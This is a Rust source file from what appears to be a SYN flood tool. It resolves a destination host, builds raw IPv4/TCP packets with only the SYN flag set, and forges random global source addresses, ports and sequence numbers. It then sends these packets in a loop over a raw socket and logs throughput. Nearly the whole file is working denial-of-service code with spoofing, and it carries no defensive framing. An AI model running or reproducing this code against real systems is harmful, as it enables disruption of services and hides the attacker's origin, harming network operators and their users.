use crate::{
    error::SynFloodError,
    option::Opt,
    random::{random_global_ipv4_addr, random_source_port},
    runner::run,
};
use log::{debug, info};
use pnet::{
    packet::{
        ip::IpNextHeaderProtocols,
        ipv4::{self, Ipv4Packet, MutableIpv4Packet},
        tcp::{self, MutableTcpPacket, TcpFlags, TcpPacket},
        MutablePacket, Packet,
    },
    transport::{transport_channel, TransportChannelType},
};
use rand::Rng;
use std::{
    convert::TryInto,
    net::{IpAddr, SocketAddr, SocketAddrV4, SocketAddrV6, ToSocketAddrs},
};

pub fn resolve_destination(option: &Opt) -> Result<SocketAddr, SynFloodError> {
    let addrs: Vec<_> = option
        .destination
        .to_socket_addrs()
        .map_err(|e| SynFloodError::ToSocketAddrs(option.destination.clone(), e))?
        .collect();
    addrs.iter().for_each(|addr| {
        info!(
            "address resolved for destination \"{}\": {}",
            option.destination, addr
        );
    });
    addrs
        .into_iter()
        .filter(|addr| {
            if option.ipv4 && !addr.is_ipv4() {
                info!("address {} excluded by option ipv4", addr);
                false
            } else {
                true
            }
        })
        .find(|addr| {
            if option.ipv6 && !addr.is_ipv6() {
                info!("address {} excluded by option ipv6", addr);
                false
            } else {
                true
            }
        })
        .ok_or(SynFloodError::NoSocketAddr)
}

pub fn flood_v4(opt: &Opt, socket_addr: &SocketAddrV4) -> Result<(), SynFloodError> {
    let addr = socket_addr.ip();
    let port = socket_addr.port();
    let (mut sender, _) = transport_channel(
        opt.buffer_size,
        TransportChannelType::Layer3(IpNextHeaderProtocols::Tcp),
    )
    .map_err(SynFloodError::TransportChannel)?;

    // create minimum IPv4 packet with minimum payload of TCP packet
    let ipv4_header_size = Ipv4Packet::minimum_packet_size();
    let tcp_header_size = TcpPacket::minimum_packet_size();
    let size = ipv4_header_size + tcp_header_size;
    // ensure size values are valid
    assert!(size < std::u16::MAX as usize);
    assert_eq!(ipv4_header_size % 4, 0);
    assert!(ipv4_header_size / 4 < std::u8::MAX as usize);
    assert_eq!(tcp_header_size % 4, 0);
    assert!(tcp_header_size / 4 < 2 ^ 4);

    // create owned IPv4 packet
    let mut ipv4_packet = MutableIpv4Packet::owned({
        let mut v = Vec::new();
        v.resize(size, 0u8);
        v
    })
    .ok_or(SynFloodError::NewIpv4Packet)?;
    // construct main content of packets except part for spoofing
    ipv4_packet.set_version(4); // IP version 4
    ipv4_packet.set_header_length((ipv4_header_size / 4).try_into().unwrap());
    ipv4_packet.set_dscp(0); // best effort
    ipv4_packet.set_ecn(0); // no ecn supported
    ipv4_packet.set_total_length(size.try_into().unwrap());
    // leave identification all zero
    ipv4_packet.set_flags(0); // not DF, not MF
    ipv4_packet.set_fragment_offset(0);
    ipv4_packet.set_ttl(opt.ttl);
    ipv4_packet.set_next_level_protocol(IpNextHeaderProtocols::Tcp);
    // leave checksum all zero
    // leave source ip address all zero
    ipv4_packet.set_destination(*addr);
    debug!("basic IPv4 packet constructed: {:?}", ipv4_packet);
    {
        // create TCP packet of mutable reference of `[u8]` in IPv4 packet
        let mut tcp_packet =
            MutableTcpPacket::new(ipv4_packet.payload_mut()).ok_or(SynFloodError::NewTcpPacket)?;
        // leave source port all zero
        tcp_packet.set_destination(port);
        // leave sequence number all zero
        tcp_packet.set_acknowledgement(0);
        tcp_packet.set_data_offset((tcp_header_size / 4).try_into().unwrap());
        tcp_packet.set_flags(TcpFlags::SYN); // only set flag SYN
        tcp_packet.set_window(opt.window_size);
        // leave checksum all zero
        tcp_packet.set_urgent_ptr(0);
        debug!(
            "basic TCP payload of IPv4 packet constructed: {:?}",
            tcp_packet
        );
    }
    let mut rng = rand::thread_rng();
    let statistics = run(
        opt,
        || {
            ipv4_packet.set_identification(rng.gen()); // random identification
            let source_addr = opt
                .source_address
                .map(|source| match source {
                    IpAddr::V4(source) => Ok(source),
                    IpAddr::V6(source) => {
                        Err(SynFloodError::Ipv4DestinationWithIpv6Source(*addr, source))
                    },
                })
                .transpose()?
                .unwrap_or_else(|| random_global_ipv4_addr(opt, &mut rng));
            ipv4_packet.set_source(source_addr);
            ipv4_packet.set_checksum(ipv4::checksum(&ipv4_packet.to_immutable()));
            {
                let mut tcp_packet = MutableTcpPacket::new(ipv4_packet.payload_mut())
                    .ok_or(SynFloodError::NewTcpPacket)?;
                let source_port = opt
                    .source_port
                    .unwrap_or_else(|| random_source_port(opt, &mut rng));
                tcp_packet.set_source(source_port);
                tcp_packet.set_sequence(rng.gen()); // random sequence number
                tcp_packet.set_checksum(tcp::ipv4_checksum(
                    &tcp_packet.to_immutable(),
                    &source_addr,
                    addr,
                ));
            }
            let packet = ipv4_packet.to_immutable();
            debug!(
                "about to packet {:?} with payload {:?}",
                packet,
                TcpPacket::new(packet.payload()).unwrap()
            );
            sender
                .send_to(packet, IpAddr::V4(*addr))
                .map_err(SynFloodError::SendPacket)?; // ignore Ok result
            Ok(())
        },
        |statistics| {
            info!("summary: duration = {:?}, packet sent = {}, success = {}, failed = {}, package per second = {}",
            statistics.duration()?,
            statistics.total(),
            statistics.success,
            statistics.failed,
            statistics.packet_per_second()?,
        );
            Ok(())
        },
    )?;
    info!("finished: duration = {:?}, packet sent = {}, success = {}, failed = {}, package per second = {}",
          statistics.duration()?,
          statistics.total(),
          statistics.success,
          statistics.failed,
          statistics.packet_per_second()?,
    );
    Ok(())
}

pub fn flood_v6(_option: &Opt, socket_addr: &SocketAddrV6) -> Result<(), SynFloodError> {
    let _addr = socket_addr.ip();
    let _port = socket_addr.port();
    unimplemented!()
}
